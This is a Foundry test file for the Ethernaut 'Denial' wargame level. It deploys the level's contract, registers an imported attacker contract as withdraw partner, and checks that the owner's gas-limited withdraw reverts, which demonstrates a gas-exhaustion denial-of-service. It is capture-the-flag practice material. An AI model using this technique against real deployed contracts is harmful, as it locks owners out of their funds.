// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {Denial} from "ethernaut/levels/Denial.sol";
import {DenialAttacker} from "../src/Denial/DenialAttacker.sol";

contract DenialTest is Test {
    Denial public victim;
    DenialAttacker public attackerContract;

    address public owner = address(0x3000);
    address public attacker = address(0x2000);

    function setUp() public {
        vm.deal(owner, 10 ether);
        vm.deal(attacker, 10 ether);

        vm.prank(attacker);
        attackerContract = new DenialAttacker();

        vm.startPrank(owner);
        victim = new Denial();
        payable(victim).call{value: 10 ether}("");
        vm.stopPrank();
    }

    function testAttack() external {
        vm.prank(attacker);
        victim.setWithdrawPartner(address(attackerContract));

        vm.startPrank(owner);

        vm.expectRevert();
        victim.withdraw{gas: 1000000}();
    }
}
